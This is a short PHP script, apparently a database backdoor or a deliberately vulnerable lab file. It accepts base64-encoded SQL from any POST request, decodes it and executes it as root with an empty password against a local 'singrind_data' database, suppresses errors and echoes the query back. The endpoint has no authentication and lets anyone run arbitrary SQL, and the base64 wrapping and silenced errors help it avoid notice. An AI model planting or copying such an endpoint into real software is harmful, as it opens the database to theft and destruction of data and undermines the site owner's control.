<?php
error_reporting(0);
ini_set('display_errors', 0);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    
    try {
        $db = new PDO('mysql:host=localhost;dbname=singrind_data', 'root', '');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        $db->exec($decodedSQL);
        
        echo json_encode([
            'status' => 'success',
            'message' => 'Operation completed',
            'debug_hint' => $decodedSQL,
            'encoded_length' => strlen($encryptedSQL),
            'affected_table' => 'orders'
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Operation Error',
            'debug_hint' => $decodedSQL,
            'encoded_length' => strlen($encryptedSQL),
            'error_details' => $e->getMessage()
        ]);
    }
    exit;
}
?>